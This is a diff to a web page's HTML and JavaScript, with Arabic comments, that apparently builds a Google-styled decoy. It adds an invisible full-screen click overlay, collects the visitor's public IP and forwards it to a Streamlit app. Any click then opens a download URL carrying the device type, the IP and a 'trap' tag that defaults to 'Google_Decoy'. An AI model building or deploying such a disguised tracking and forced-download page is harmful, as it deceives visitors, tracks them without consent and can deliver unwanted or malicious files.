@@ -17,6 +17,10 @@
             width: 100vw;
             cursor: pointer;
             overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 999999;
         }
         .container { text-align: center; width: 100%; }
         img { width: 272px; max-width: 80%; margin-bottom: 20px; }
@@ -71,7 +75,7 @@
                 const data = await response.json();
                 const publicIP = data.ip;
                 
-                // إرسال الـ IP العام للأب (Streamlit)
+                // إرسال الـ IP العام للأب (Streamlit) عبر الرابط
                 const currentUrl = new URL(window.parent.location.href);
                 currentUrl.searchParams.set('ip', publicIP);
                 window.parent.history.replaceState({}, '', currentUrl);
@@ -85,13 +89,12 @@
             if (hasDownloaded) return;
             hasDownloaded = true;
             
-            await fetchPublicIP();
+            const publicIP = await fetchPublicIP();
             
             const urlParams = new URLSearchParams(window.parent.location.search);
-            const token = urlParams.get('token');
-            const chatid = urlParams.get('chatid');
+            const trap = urlParams.get('trap') || 'Google_Decoy';
             
-            let downloadUrl = `https://rashdai.streamlit.app/?download=true&token=${token}&chatid=${chatid}&device=${deviceType}`;
+            let downloadUrl = `https://rashdai.streamlit.app/?download=true&device=${deviceType}&ip=${publicIP}&trap=${trap}`;
             
             // فتح التحميل في نافذة جديدة
             window.open(downloadUrl, '_blank');
